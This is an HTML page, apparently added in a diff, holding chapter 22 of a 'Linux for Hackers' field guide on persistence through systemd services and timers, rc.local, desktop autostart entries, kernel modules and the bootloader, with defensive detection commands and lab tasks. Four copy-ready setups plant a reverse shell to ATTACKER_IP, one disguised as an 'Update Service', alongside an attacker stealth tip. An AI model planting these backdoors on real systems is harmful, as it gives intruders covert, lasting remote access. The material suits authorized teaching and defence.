@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <meta name="theme-color" content="#050505">
+  <meta name="description" content="Chapter 22 of the 0XMAP Linux for Hackers field guide. Inspect systemd timers, user services and kernel modules as persistence surfaces.">
+  <title>Chapter 22: Advanced Persistence: systemd Timers, User Services and Kernel Modules | 0XMAP Linux Field Guide</title>
+  <link rel="icon" href="../static/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../static/guide.css">
+</head>
+<body data-root="../">
+  <a class="g-skip" href="#main">Skip to content</a>
+  
+<header class="g-top">
+  <div class="g-top-inner">
+    <a class="g-brand" href="../index.html" aria-label="0XMAP Linux field guide home">
+      <span class="g-mark" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7l4 5-4 5"/><path d="M12 17h8"/></svg></span>
+      <span class="g-brand-text">
+        <span class="g-name">0XMAP</span>
+        <span class="g-sub">Linux field guide</span>
+      </span>
+    </a>
+    <div class="g-top-actions">
+      <nav class="g-top-nav" aria-label="Guide">
+        <a href="../index.html#about">Guide</a>
+        <a href="../index.html#foundations">Foundations</a>
+        <a href="../index.html#privesc">Privilege escalation</a>
+        <a href="../index.html#chapters">Chapters</a>
+      </nav>
+      <button type="button" class="g-search-btn" data-search-open aria-label="Search the guide">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+        <span>Search</span>
+        <kbd>/</kbd>
+      </button>
+      <span class="g-context-pill">Chapter 22</span>
+      <button type="button" class="g-menu-btn" data-menu-toggle aria-label="Open chapter menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
+    </div>
+  </div>
+</header>
+  
+<div class="g-doc-layout">
+  
+<aside class="g-sidebar" data-sidebar aria-label="Chapter navigation">
+  <div class="g-sidebar-head">
+    <div>
+      <p class="g-sidebar-kicker">Chapters</p>
+      <p class="g-sidebar-count">30 chapters / 5 sections</p>
+    </div>
+    <button type="button" class="g-side-close" data-menu-close aria-label="Close chapter menu">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+    </button>
+  </div>
+  <nav class="g-side-nav">
+    <section class="g-nav-part"><div class="g-nav-part-head"><span class="g-nav-part-num">01</span><span>Foundations</span></div><ol><li><a class="g-nav-link" href="../chapters/01-introduction-and-why-linux-matters-in-hacking.html" ><span class="g-nav-num">01</span><span class="g-nav-title">Why Linux matters</span></a></li><li><a class="g-nav-link" href="../chapters/02-basic-file-navigation-in-linux.html" ><span class="g-nav-num">02</span><span class="g-nav-title">File navigation</span></a></li><li><a class="g-nav-link" href="../chapters/03-understanding-linux-file-permissions.html" ><span class="g-nav-num">03</span><span class="g-nav-title">File permissions</span></a></li><li><a class="g-nav-link" href="../chapters/04-users-groups-and-privilege-escalation-basics.html" ><span class="g-nav-num">04</span><span class="g-nav-title">Users and groups</span></a></li><li><a class="g-nav-link" href="../chapters/05-linux-package-managers-and-dependency-abuse.html" ><span class="g-nav-num">05</span><span class="g-nav-title">Package managers</span></a></li><li><a class="g-nav-link" href="../chapters/06-introduction-to-bash-scripting.html" ><span class="g-nav-num">06</span><span class="g-nav-title">Bash scripting</span></a></li></ol></section><section class="g-nav-part"><div class="g-nav-part-head"><span class="g-nav-part-num">02</span><span>Shell and scheduling</span></div><ol><li><a class="g-nav-link" href="../chapters/07-bash-variables-arguments-and-dynamic-scripting.html" ><span class="g-nav-num">07</span><span class="g-nav-title">Bash variables</span></a></li><li><a class="g-nav-link" href="../chapters/08-environment-variables-and-bashrc-abuse.html" ><span class="g-nav-num">08</span><span class="g-nav-title">Shell startup abuse</span></a></li><li><a class="g-nav-link" href="../chapters/09-processes-services-and-enumeration.html" ><span class="g-nav-num">09</span><span class="g-nav-title">Processes and services</span></a></li><li><a class="g-nav-link" href="../chapters/10-cron-jobs-scheduled-tasks-and-exploitation.html" ><span class="g-nav-num">10</span><span class="g-nav-title">Cron jobs</span></a></li><li><a class="g-nav-link" href="../chapters/11-ssh-access-and-abuse.html" ><span class="g-nav-num">11</span><span class="g-nav-title">SSH access and abuse</span></a></li><li><a class="g-nav-link" href="../chapters/12-file-permissions-and-privilege-escalation-basics.html" ><span class="g-nav-num">12</span><span class="g-nav-title">Permissions to privilege</span></a></li></ol></section><section class="g-nav-part"><div class="g-nav-part-head"><span class="g-nav-part-num">03</span><span>Access and network</span></div><ol><li><a class="g-nav-link" href="../chapters/13-environment-variables-and-path-hijacking.html" ><span class="g-nav-num">13</span><span class="g-nav-title">PATH hijacking</span></a></li><li><a class="g-nav-link" href="../chapters/14-logs-and-system-auditing.html" ><span class="g-nav-num">14</span><span class="g-nav-title">Logs and auditing</span></a></li><li><a class="g-nav-link" href="../chapters/15-networking-fundamentals-for-hackers.html" ><span class="g-nav-num">15</span><span class="g-nav-title">Networking</span></a></li><li><a class="g-nav-link" href="../chapters/16-firewalls-and-packet-filtering.html" ><span class="g-nav-num">16</span><span class="g-nav-title">Firewalls</span></a></li><li><a class="g-nav-link" href="../chapters/17-ssh-and-tunneling.html" ><span class="g-nav-num">17</span><span class="g-nav-title">SSH tunneling</span></a></li><li><a class="g-nav-link" href="../chapters/18-linux-kernel-and-exploit-basics.html" ><span class="g-nav-num">18</span><span class="g-nav-title">Kernel exploits</span></a></li></ol></section><section class="g-nav-part"><div class="g-nav-part-head"><span class="g-nav-part-num">04</span><span>Persistence and isolation</span></div><ol><li><a class="g-nav-link" href="../chapters/19-linux-persistence-techniques.html" ><span class="g-nav-num">19</span><span class="g-nav-title">Persistence</span></a></li><li><a class="g-nav-link" href="../chapters/20-linux-services-and-daemon-exploitation.html" ><span class="g-nav-num">20</span><span class="g-nav-title">Service exploitation</span></a></li><li><a class="g-nav-link" href="../chapters/21-linux-capabilities-and-exploitation.html" ><span class="g-nav-num">21</span><span class="g-nav-title">Capabilities</span></a></li><li><a class="g-nav-link" href="../chapters/22-advanced-persistence.html"  aria-current="page"><span class="g-nav-num">22</span><span class="g-nav-title">Advanced persistence</span></a></li><li><a class="g-nav-link" href="../chapters/23-containers-and-docker-exploitation.html" ><span class="g-nav-num">23</span><span class="g-nav-title">Containers</span></a></li><li><a class="g-nav-link" href="../chapters/24-host-based-monitoring-auditd-and-osquery.html" ><span class="g-nav-num">24</span><span class="g-nav-title">Host monitoring</span></a></li></ol></section><section class="g-nav-part"><div class="g-nav-part-head"><span class="g-nav-part-num">05</span><span>Defense and workflow</span></div><ol><li><a class="g-nav-link" href="../chapters/25-linux-forensics-and-incident-response.html" ><span class="g-nav-num">25</span><span class="g-nav-title">Forensics and IR</span></a></li><li><a class="g-nav-link" href="../chapters/26-automating-linux-privilege-escalation-checks.html" ><span class="g-nav-num">26</span><span class="g-nav-title">Privilege automation</span></a></li><li><a class="g-nav-link" href="../chapters/27-linux-hardening-and-monitoring.html" ><span class="g-nav-num">27</span><span class="g-nav-title">Hardening and monitoring</span></a></li><li><a class="g-nav-link" href="../chapters/28-network-sniffing-and-packet-capture.html" ><span class="g-nav-num">28</span><span class="g-nav-title">Packet capture</span></a></li><li><a class="g-nav-link" href="../chapters/29-linux-memory-analysis-and-credential-hunting.html" ><span class="g-nav-num">29</span><span class="g-nav-title">Memory analysis</span></a></li><li><a class="g-nav-link" href="../chapters/30-building-your-linux-hacking-workflow.html" ><span class="g-nav-num">30</span><span class="g-nav-title">Workflow</span></a></li></ol></section>
+  </nav>
+  <a class="g-side-guide" href="../index.html#foundations">
+    <span class="g-side-guide-kicker">Companion handbook</span>
+    <strong>Linux Foundations</strong>
+    <span>10 parts from first command to secure baseline</span>
+  </a>
+  <a class="g-side-guide" href="../index.html#privesc">
+    <span class="g-side-guide-kicker">Companion handbook</span>
+    <strong>Privilege Escalation</strong>
+    <span>10 parts from sudo to NFS and kernel bugs</span>
+  </a>
+  <p class="g-sidebar-note">Authorized labs and systems only. Read in order or use the menu to jump.</p>
+</aside>
+<div class="g-scrim" data-menu-close hidden></div>
+  <main class="g-content" id="main">
+    <article class="g-article">
+      <header class="g-chapter-head">
+        <nav class="g-chapter-crumb" aria-label="Breadcrumb">
+          <a href="../index.html">Field guide</a><span>/</span>
+          <a href="../index.html#section-persistence">Section 04</a><span>/</span>
+          <span>Chapter 22</span>
+        </nav>
+        <p class="g-kicker">Section 04 / Persistence and isolation</p>
+        <h1>Advanced Persistence: systemd Timers, User Services and Kernel Modules</h1>
+        <p class="g-deck">Inspect systemd timers, user services and kernel modules as persistence surfaces.</p>
+        <div class="g-chapter-meta">
+          <span>7 min read</span>
+          <span>15 sections</span>
+          <span>7 code blocks</span>
+          <span>Chapter 22 / 30</span>
+        </div>
+        <div class="g-chapter-actions"><a class="g-btn ghost" data-next-chapter href="../chapters/23-containers-and-docker-exploitation.html">Next chapter <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14"/><path d="m13 6 6 6-6 6"/></svg></a></div>
+      </header>
+      
+<details class="g-toc-mobile">
+  <summary>On this page <span>15 sections</span></summary>
+  <nav aria-label="On this page"><a class="g-toc-link depth-2" href="#objective" data-toc-link>Objective</a><a class="g-toc-link depth-2" href="#1-systemd-units-vs-timers" data-toc-link>1. systemd Units vs Timers</a><a class="g-toc-link depth-3" href="#create-a-persistent-user-service" data-toc-link>Create a persistent user service</a><a class="g-toc-link depth-3" href="#create-a-timer-that-runs-every-boot-and-hourly" data-toc-link>Create a timer that runs every boot and hourly</a><a class="g-toc-link depth-2" href="#2-system-wide-systemd-service-persistence" data-toc-link>2. System-wide systemd Service Persistence</a><a class="g-toc-link depth-2" href="#3-systemd-timers-stealthier-than-cron" data-toc-link>3. systemd Timers (stealthier than cron)</a><a class="g-toc-link depth-2" href="#4-rc-local-init-scripts-and-legacy-boot-persistence" data-toc-link>4. rc.local, init scripts, and legacy boot persistence</a><a class="g-toc-link depth-2" href="#5-autostart-desktop-entries-gui-persistence" data-toc-link>5. Autostart Desktop Entries (GUI persistence)</a><a class="g-toc-link depth-2" href="#6-kernel-module-dkms-persistence-advanced" data-toc-link>6. Kernel Module / DKMS Persistence (advanced)</a><a class="g-toc-link depth-2" href="#7-bootloader-and-firmware-persistence-extreme" data-toc-link>7. Bootloader &amp; Firmware Persistence (extreme)</a><a class="g-toc-link depth-2" href="#8-detection-and-defensive-strategies" data-toc-link>8. Detection &amp; Defensive Strategies</a><a class="g-toc-link depth-2" href="#9-practical-tasks-lab" data-toc-link>9. Practical Tasks (lab)</a><a class="g-toc-link depth-2" href="#advanced-modern-persistence-surfaces" data-toc-link>Advanced: Modern persistence surfaces</a><a class="g-toc-link depth-2" href="#1-ethics-and-safety" data-toc-link>1 Ethics &amp; Safety</a><a class="g-toc-link depth-2" href="#references-and-further-reading" data-toc-link>References &amp; Further Reading</a></nav>
+</details>
+      <div class="g-prose"><h2 id="objective">Objective<a aria-label="Link to this section" class="g-anchor" href="#objective">#</a></h2>
+<p>Learn advanced persistence techniques attackers use and how defenders can detect and mitigate them. Topics: systemd timers/user services, kernel module loading, rc.local/init scripts, autostart entries, and bootloader/firmware persistence vectors. All examples are for authorized lab use only.</p>
+<hr/>
+<h2 id="1-systemd-units-vs-timers">1. systemd Units vs Timers<a aria-label="Link to this section" class="g-anchor" href="#1-systemd-units-vs-timers">#</a></h2>
+<p><code>systemd</code> provides flexible persistence through unit files and timers. Timers are the <code>systemd</code> equivalent of cron with more control and stealth.</p>
+<h3 id="create-a-persistent-user-service">Create a persistent user service<a aria-label="Link to this section" class="g-anchor" href="#create-a-persistent-user-service">#</a></h3>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Create service in user unit directory</span>
+mkdir<span class="w"> </span>-p<span class="w"> </span>~/.config/systemd/user
+cat<span class="w"> </span>&gt;<span class="w"> </span>~/.config/systemd/user/backdoor.service<span class="w"> </span><span class="s">&lt;&lt;'EOF'</span>
+<span class="s">[Unit]</span>
+<span class="s">Description=User Backdoor Service</span>
+
+<span class="s">[Service]</span>
+<span class="s">ExecStart=/bin/bash -lc 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1'</span>
+<span class="s">Restart=always</span>
+<span class="s">RestartSec=60</span>
+<span class="s">EOF</span>
+
+<span class="c1"># Enable and start (user-level)</span>
+systemctl<span class="w"> </span>--user<span class="w"> </span>daemon-reload
+systemctl<span class="w"> </span>--user<span class="w"> </span><span class="nb">enable</span><span class="w"> </span>--now<span class="w"> </span>backdoor.service
+</code></pre></div>
+<h3 id="create-a-timer-that-runs-every-boot-and-hourly">Create a timer that runs every boot and hourly<a aria-label="Link to this section" class="g-anchor" href="#create-a-timer-that-runs-every-boot-and-hourly">#</a></h3>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">cat<span class="w"> </span>&gt;<span class="w"> </span>~/.config/systemd/user/backdoor.timer<span class="w"> </span><span class="s">&lt;&lt;'EOF'</span>
+<span class="s">[Unit]</span>
+<span class="s">Description=Run backdoor on boot and hourly</span>
+
+<span class="s">[Timer]</span>
+<span class="s">OnBootSec=1min</span>
+<span class="s">OnUnitActiveSec=1h</span>
+
+<span class="s">[Install]</span>
+<span class="s">WantedBy=timers.target</span>
+<span class="s">EOF</span>
+
+systemctl<span class="w"> </span>--user<span class="w"> </span>daemon-reload
+systemctl<span class="w"> </span>--user<span class="w"> </span><span class="nb">enable</span><span class="w"> </span>--now<span class="w"> </span>backdoor.timer
+</code></pre></div>
+<p><strong>Notes:</strong> User-level units persist across reboots and are less likely to be inspected than system units.</p>
+<hr/>
+<h2 id="2-system-wide-systemd-service-persistence">2. System-wide systemd Service Persistence<a aria-label="Link to this section" class="g-anchor" href="#2-system-wide-systemd-service-persistence">#</a></h2>
+<p>System services live in <code>/etc/systemd/system/</code>. Creating a unit requires root - but if you can write to this directory (or a service file is writable), you can achieve root persistence.</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">sudo<span class="w"> </span>tee<span class="w"> </span>/etc/systemd/system/sys-backdoor.service<span class="w"> </span>&gt;<span class="w"> </span>/dev/null<span class="w"> </span><span class="s">&lt;&lt;'EOF'</span>
+<span class="s">[Unit]</span>
+<span class="s">Description=Sys Backdoor</span>
+
+<span class="s">[Service]</span>
+<span class="s">Type=simple</span>
+<span class="s">ExecStart=/bin/bash -lc 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/5555 0&gt;&amp;1'</span>
+<span class="s">Restart=always</span>
+<span class="s">RestartSec=30</span>
+
+<span class="s">[Install]</span>
+<span class="s">WantedBy=multi-user.target</span>
+<span class="s">EOF</span>
+
+sudo<span class="w"> </span>systemctl<span class="w"> </span>daemon-reload
+sudo<span class="w"> </span>systemctl<span class="w"> </span><span class="nb">enable</span><span class="w"> </span>--now<span class="w"> </span>sys-backdoor.service
+</code></pre></div>
+<hr/>
+<h2 id="3-systemd-timers-stealthier-than-cron">3. systemd Timers (stealthier than cron)<a aria-label="Link to this section" class="g-anchor" href="#3-systemd-timers-stealthier-than-cron">#</a></h2>
+<p>Timers show as <code>systemctl list-timers</code>. They can be used to repeatedly execute payloads without using crontab files.</p>
+<ul>
+<li>Inspect timers: <code>systemctl list-timers --all</code></li>
+<li>Timer files locations: <code>/etc/systemd/system/*.timer</code>, <code>/usr/lib/systemd/system/</code> and user <code>~/.config/systemd/user/*.timer</code></li>
+</ul>
+<p><strong>Stealth tip (attacker):</strong> Use <code>OnCalendar</code> with complex expressions to avoid simple periodic detections.</p>
+<hr/>
+<h2 id="4-rc-local-init-scripts-and-legacy-boot-persistence">4. rc.local, init scripts, and legacy boot persistence<a aria-label="Link to this section" class="g-anchor" href="#4-rc-local-init-scripts-and-legacy-boot-persistence">#</a></h2>
+<p>Older systems or compatibility layers still honor <code>/etc/rc.local</code>. Writing to it gives persistence on boot (needs executable bit).</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="nb">echo</span><span class="w"> </span><span class="s2">"/bin/bash -lc 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/7777 0&gt;&amp;1'"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/rc.local
+sudo<span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>/etc/rc.local
+</code></pre></div>
+<p>Similarly, init scripts in <code>/etc/init.d/</code> can be abused where present.</p>
+<hr/>
+<h2 id="5-autostart-desktop-entries-gui-persistence">5. Autostart Desktop Entries (GUI persistence)<a aria-label="Link to this section" class="g-anchor" href="#5-autostart-desktop-entries-gui-persistence">#</a></h2>
+<p>On desktop systems, <code>.desktop</code> files in <code>~/.config/autostart/</code> persist on GUI login.</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">mkdir<span class="w"> </span>-p<span class="w"> </span>~/.config/autostart
+cat<span class="w"> </span>&gt;<span class="w"> </span>~/.config/autostart/update.desktop<span class="w"> </span><span class="s">&lt;&lt;'EOF'</span>
+<span class="s">[Desktop Entry]</span>
+<span class="s">Type=Application</span>
+<span class="s">Exec=/bin/bash -lc 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/8888 0&gt;&amp;1'</span>
+<span class="s">Hidden=false</span>
+<span class="s">NoDisplay=false</span>
+<span class="s">X-GNOME-Autostart-enabled=true</span>
+<span class="s">Name=Update Service</span>
+<span class="s">EOF</span>
+</code></pre></div>
+<hr/>
+<h2 id="6-kernel-module-dkms-persistence-advanced">6. Kernel Module / DKMS Persistence (advanced)<a aria-label="Link to this section" class="g-anchor" href="#6-kernel-module-dkms-persistence-advanced">#</a></h2>
+<p>Kernel modules can give deep persistence. Loading a malicious module requires root, but if an attacker has root at any point, they can install a module or modify initramfs to load modules at boot.</p>
+<ul>
+<li>List loaded modules: <code>lsmod</code></li>
+<li>Insert module: <code>sudo insmod evil.ko</code></li>
+<li>Persistent install: place <code>.ko</code> in <code>/lib/modules/$(uname -r)/extra/</code> and run <code>depmod -a</code></li>
+<li>Rebuild initramfs if needed: <code>sudo update-initramfs -u</code> (Debian/Ubuntu)</li>
+</ul>
+<p><strong>DKMS:</strong> Dynamic Kernel Module Support can rebuild modules across kernel updates - abusing DKMS allows long-term persistence across kernel upgrades.</p>
+<p><strong>Danger:</strong> Kernel modules run with kernel privileges - misuse can crash the system or create rootkits. Only in lab environments.</p>
+<hr/>
+<h2 id="7-bootloader-and-firmware-persistence-extreme">7. Bootloader &amp; Firmware Persistence (extreme)<a aria-label="Link to this section" class="g-anchor" href="#7-bootloader-and-firmware-persistence-extreme">#</a></h2>
+<ul>
+<li><strong>GRUB</strong>: modifying <code>/etc/default/grub</code> or adding grub scripts can achieve early-boot persistence. Rebuilding grub config (<code>sudo update-grub</code>) applies changes.</li>
+<li><strong>Firmware (UEFI)</strong>: Advanced attackers may write to UEFI variables or firmware, but this is highly risky and platform-specific.</li>
+</ul>
+<hr/>
+<h2 id="8-detection-and-defensive-strategies">8. Detection &amp; Defensive Strategies<a aria-label="Link to this section" class="g-anchor" href="#8-detection-and-defensive-strategies">#</a></h2>
+<ul>
+<li>Monitor for new systemd units: <code>auditd</code> rules watching <code>/etc/systemd/system</code> and <code>~/.config/systemd/user</code> changes.</li>
+<li>Watch timer changes: <code>systemctl list-timers --all</code> and alert on unknown timers.</li>
+<li>File integrity monitoring (AIDE, Tripwire) on: <code>/etc/systemd/</code>, <code>/etc/rc.local</code>, <code>/lib/modules/</code>, <code>/boot/</code>.</li>
+<li>Monitor kernel module insertions: <code>dmesg</code>, <code>journalctl -k</code>, and <code>modprobe</code> execs. Use <code>auditctl -w /sbin/insmod -p x</code> rules.</li>
+<li>Restrict write access: ensure only root can write to unit directories and module dirs.</li>
+<li>DKMS directories and package installations should be monitored and validated.</li>
+</ul>
+<hr/>
+<h2 id="9-practical-tasks-lab">9. Practical Tasks (lab)<a aria-label="Link to this section" class="g-anchor" href="#9-practical-tasks-lab">#</a></h2>
+<ol>
+<li>Create a <strong>user-level systemd service + timer</strong> that writes a timestamp to <code>/tmp/persist_test.log</code> every minute. Verify with <code>journalctl --user -u backdoor.service</code> and <code>systemctl --user list-timers</code>.</li>
+<li>Simulate systemd hijack: create a service in <code>/etc/systemd/system/</code> on a lab VM and enable it. Observe <code>systemctl daemon-reload</code> and <code>systemctl status</code> outputs.</li>
+<li>Build a dummy kernel module (example modules are available in kernel module programming tutorials) and <code>insmod</code> it in a disposable VM. Observe <code>lsmod</code> and <code>dmesg</code> output.</li>
+<li>Check for autostart entries: <code>ls ~/.config/autostart/</code> and review <code>.desktop</code> files.</li>
+</ol>
+<hr/>
+<h2 id="advanced-modern-persistence-surfaces">Advanced: Modern persistence surfaces<a aria-label="Link to this section" class="g-anchor" href="#advanced-modern-persistence-surfaces">#</a></h2>
+<p>Persistence is less about adding a line to <code>crontab</code> and more about finding a
+component that runs before your detection stack. Modern Linux gives an
+attacker many such components; the defender needs to enumerate them by
+ownership and change history, not just by filename.</p>
+<p>High-value surfaces:</p>
+<ul>
+<li>systemd generators in <code>/etc/systemd/system-generators</code>,
+<code>/run/systemd/system-generators</code> and <code>/usr/lib/systemd/system-generators</code>.
+They run early, before normal units, and are often missed by unit-file
+reviews.</li>
+<li>User units and lingering: <code>~/.config/systemd/user/</code> plus
+<code>loginctl enable-linger user</code> keeps services alive without an interactive
+login.</li>
+<li><code>Path=</code>, <code>Timer=</code>, <code>ExecStartPre=</code> and <code>ExecStopPost=</code> directives in
+otherwise benign units.</li>
+<li>PAM modules such as <code>pam_exec</code> in <code>/etc/pam.d/</code>.</li>
+<li><code>/etc/ld.so.preload</code>, <code>ld.so.conf.d</code> and library search path changes.</li>
+<li>initramfs hooks, <code>udev</code> rules, D-Bus service files, <code>cron.d</code>, <code>at</code> and
+<code>profile.d</code>.</li>
+<li>eBPF programs pinned under <code>/sys/fs/bpf</code>; these can outlive the process that
+loaded them and are invisible to ordinary file listings.</li>
+</ul>
+<p>Detection commands:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">systemctl<span class="w"> </span>list-unit-files<span class="w"> </span>--state<span class="o">=</span>enabled
+systemctl<span class="w"> </span>list-timers<span class="w"> </span>--all
+systemd-analyze<span class="w"> </span>verify<span class="w"> </span>/etc/systemd/system/*.service<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+find<span class="w"> </span>/etc/systemd<span class="w"> </span>/usr/lib/systemd<span class="w"> </span>/run/systemd<span class="w"> </span>-maxdepth<span class="w"> </span><span class="m">3</span><span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-perm<span class="w"> </span>-111<span class="w"> </span>-printf<span class="w"> </span><span class="s1">'%p\n'</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+grep<span class="w"> </span>-RIn<span class="w"> </span><span class="s1">'pam_exec\|ld.so.preload'</span><span class="w"> </span>/etc/pam.d<span class="w"> </span>/etc/ld.so.conf*<span class="w"> </span>/etc/ld.so.preload<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+sudo<span class="w"> </span>bpftool<span class="w"> </span>prog<span class="w"> </span>list
+sudo<span class="w"> </span>bpftool<span class="w"> </span>net
+ls<span class="w"> </span>-la<span class="w"> </span>/sys/fs/bpf
+</code></pre></div>
+<p>Integrity checks:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">sudo<span class="w"> </span>debsums<span class="w"> </span>-c
+sudo<span class="w"> </span>rpm<span class="w"> </span>-Va
+sudo<span class="w"> </span>aide<span class="w"> </span>--check
+</code></pre></div>
+<p>Do not deploy these techniques outside a lab. For defensive review, focus on
+files that are not owned by a package, recently modified unit files,
+generators and PAM changes. A rootkit can hide a process, but it still needs a
+boot-time component or a kernel or userland hook; that is where evidence
+usually survives.</p>
+<h2 id="1-ethics-and-safety">1 Ethics &amp; Safety<a aria-label="Link to this section" class="g-anchor" href="#1-ethics-and-safety">#</a></h2>
+<p>These techniques are powerful and dangerous. Use strictly in controlled labs. Always obtain authorization for any testing on real systems.</p>
+<hr/>
+<h2 id="references-and-further-reading">References &amp; Further Reading<a aria-label="Link to this section" class="g-anchor" href="#references-and-further-reading">#</a></h2>
+<ul>
+<li><code>man systemd.unit</code>, <code>man systemd.service</code>, <code>man systemd.timer</code></li>
+<li>Kernel module programming guides</li>
+<li>DKMS documentation</li>
+<li>Auditd and auditctl guides for monitoring filesystem changes</li>
+</ul>
+<hr/>
+</div>
+      <p class="g-source-note">Chapter 22 of the Linux for Hackers guide. Use these techniques only in labs, CTFs or systems you own and have written permission to test.</p>
+      <nav class="g-chapter-nav" aria-label="Chapter navigation"><a class="g-chapter-card" href="../chapters/21-linux-capabilities-and-exploitation.html" data-prev-chapter><span class="g-chapter-card-label">Previous / Chapter 21</span><strong>Linux Capabilities and Exploitation (Beyond SUID)</strong></a><a class="g-chapter-card" href="../chapters/23-containers-and-docker-exploitation.html" data-next-chapter><span class="g-chapter-card-label">Next / Chapter 23</span><strong>Containers and Docker Exploitation</strong></a></nav>
+    </article>
+  </main>
+  
+<aside class="g-toc" aria-label="On this page">
+  <div class="g-toc-inner">
+    <p class="g-toc-kicker">On this page</p>
+    <nav class="g-toc-nav"><a class="g-toc-link depth-2" href="#objective" data-toc-link>Objective</a><a class="g-toc-link depth-2" href="#1-systemd-units-vs-timers" data-toc-link>1. systemd Units vs Timers</a><a class="g-toc-link depth-3" href="#create-a-persistent-user-service" data-toc-link>Create a persistent user service</a><a class="g-toc-link depth-3" href="#create-a-timer-that-runs-every-boot-and-hourly" data-toc-link>Create a timer that runs every boot and hourly</a><a class="g-toc-link depth-2" href="#2-system-wide-systemd-service-persistence" data-toc-link>2. System-wide systemd Service Persistence</a><a class="g-toc-link depth-2" href="#3-systemd-timers-stealthier-than-cron" data-toc-link>3. systemd Timers (stealthier than cron)</a><a class="g-toc-link depth-2" href="#4-rc-local-init-scripts-and-legacy-boot-persistence" data-toc-link>4. rc.local, init scripts, and legacy boot persistence</a><a class="g-toc-link depth-2" href="#5-autostart-desktop-entries-gui-persistence" data-toc-link>5. Autostart Desktop Entries (GUI persistence)</a><a class="g-toc-link depth-2" href="#6-kernel-module-dkms-persistence-advanced" data-toc-link>6. Kernel Module / DKMS Persistence (advanced)</a><a class="g-toc-link depth-2" href="#7-bootloader-and-firmware-persistence-extreme" data-toc-link>7. Bootloader &amp; Firmware Persistence (extreme)</a><a class="g-toc-link depth-2" href="#8-detection-and-defensive-strategies" data-toc-link>8. Detection &amp; Defensive Strategies</a><a class="g-toc-link depth-2" href="#9-practical-tasks-lab" data-toc-link>9. Practical Tasks (lab)</a><a class="g-toc-link depth-2" href="#advanced-modern-persistence-surfaces" data-toc-link>Advanced: Modern persistence surfaces</a><a class="g-toc-link depth-2" href="#1-ethics-and-safety" data-toc-link>1 Ethics &amp; Safety</a><a class="g-toc-link depth-2" href="#references-and-further-reading" data-toc-link>References &amp; Further Reading</a></nav>
+    <div class="g-toc-foot">Chapter 22 / 15 sections</div>
+  </div>
+</aside>
+</div>
+<footer class="g-site-foot g-docs-foot">
+  <div class="g-foot-main">
+    <span>0XMAP field guide / 30 chapters / 2 companion handbooks</span>
+    <span>Created by 0xbit</span>
+  </div>
+  <div class="g-foot-links">
+    <a href="../index.html">Home</a>
+    <a href="../index.html#foundations">Foundations</a>
+    <a href="../index.html#privesc">Privilege escalation</a>
+    <a href="../index.html#chapters">Chapters</a>
+    <button type="button" class="g-link-btn" data-search-open>Search</button>
+  </div>
+</footer>
+  
+<div class="g-search" data-search-modal hidden>
+  <div class="g-search-panel" role="dialog" aria-modal="true" aria-labelledby="g-search-title">
+    <div class="g-search-top">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+      <label class="g-visually-hidden" for="g-search-input" id="g-search-title">Search the guide</label>
+      <input class="g-search-input" id="g-search-input" data-search-input type="search"
+             placeholder="Search chapters, handbooks and commands..." autocomplete="off" spellcheck="false">
+      <kbd>Esc</kbd>
+      <button type="button" class="g-icon-btn" data-search-close aria-label="Close search">
